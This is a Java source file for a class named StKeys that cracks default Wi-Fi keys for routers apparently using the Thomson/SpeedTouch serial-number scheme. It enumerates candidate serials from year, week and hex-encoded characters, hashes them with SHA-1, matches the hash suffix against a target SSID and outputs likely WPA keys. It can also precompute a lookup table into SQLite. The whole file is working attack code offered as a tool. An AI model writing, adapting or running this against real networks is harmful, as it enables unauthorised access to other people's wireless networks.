import com.sun.org.apache.xerces.internal.impl.dv.util.HexBin;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Collection;

/**
 * @author Sohel Zerdoumi <sohel.zerdoumi@gmail.com>
 * @since 07/02/15.
 */
public class StKeys {

    public StKeys() {
        try {
            this.mdSha1 = MessageDigest.getInstance("SHA-1");
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
    }

    public void saveToDatabase() {
        this.prepare();

        String tmpHash;
        String tmpSerial;
        SqliteManager.connect();
        SqliteManager.beginTransaction();
        for (String year : this.years) {
            for (String week : this.weeks) {
                for (String endString : this.endString) {
                    tmpSerial = "CP" + year + week + endString;
                    tmpHash = toSha1(tmpSerial);

                    SqliteManager.insertWireless(tmpSerial, tmpHash);
                }
            }
        }
        SqliteManager.endTransaction();
        SqliteManager.close();
    }

    public Collection<String> crack(String ssid) {
        this.prepare();

        ArrayList<String> foundedKeys = new ArrayList<String>();
        String tmpHash;
        String tmpSerial;
        ssid = ssid.toUpperCase();

        for (String year : this.years) {
            for (String week : this.weeks) {
                for (String endString : this.endString) {
                    tmpSerial = "CP" + year + week + endString;
                    tmpHash = toSha1(tmpSerial);
                    if (tmpHash.endsWith(ssid)) {
                        if(verbosity > 0){
                            String message = "Potential key for %s = %s";
                            System.out.println(
                                    String.format(
                                            message,
                                            "CP" + year + week + "***",
                                            tmpHash.substring(0, 10).toUpperCase()
                                    )
                            );
                        }
                        foundedKeys.add(tmpHash.substring(0, 10).toUpperCase());
                    }
                }
            }
        }
        return foundedKeys;
    }

    public String toSha1(String input) {
        mdSha1.reset();
        mdSha1.update(input.getBytes());

        return HexBin.encode(mdSha1.digest());
    }

    private void initYears() {
        for (int i = startYear; i <= endYear; i++) {
            this.years.add(String.format("%02d", i - 2000));
        }
    }

    private void initWeeks() {
        for (int i = 1; i < 53; i++) {
            this.weeks.add(String.format("%02d", i));
        }
    }

    private void initEndStrings() {
        initHexCharset();
        initEndStrings("", this.endCharsetLength);
    }

    private void initHexCharset() {
        this.hexCharset.clear();
        for (Character c : charset.toCharArray()) {
            this.hexCharset.add(Integer.toHexString((int) c).toUpperCase());
        }
    }

    private void initEndStrings(String input, int deep) {
        if (deep == 0) {
            this.endString.add(input);
        } else {
            deep = deep - 1;
            for (String hexChar : hexCharset) {
                this.initEndStrings(input + hexChar, deep);
            }
        }
    }

    public int getStartYear() {
        return startYear;
    }

    public void setStartYear(int startYear) {
        this.startYear = startYear;
    }

    public int getEndYear() {
        return endYear;
    }

    public void setEndYear(int endYear) {
        this.endYear = endYear;
    }

    public String getCharset() {
        return charset;
    }

    public void setCharset(String charset) {
        this.charset = charset;
    }

    public int getEndCharsetLength() {
        return endCharsetLength;
    }

    public void setEndCharsetLength(int endCharsetLength) {
        this.endCharsetLength = endCharsetLength;
    }

    public void prepare() {
        this.initYears();
        this.initWeeks();
        this.initEndStrings();
    }

    public int getVerbosity() {
        return verbosity;
    }

    public void setVerbosity(int verbosity) {
        this.verbosity = verbosity;
    }
    private int startYear = 2005;
    private int endYear = 2015;


    private int verbosity = 0;
    private MessageDigest mdSha1;
    private String charset = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    private Collection<String> hexCharset = new ArrayList<String>();
    private int endCharsetLength = 4;

    private Collection<String> weeks = new ArrayList<String>();
    private Collection<String> years = new ArrayList<String>();
    private Collection<String> endString = new ArrayList<String>();
}
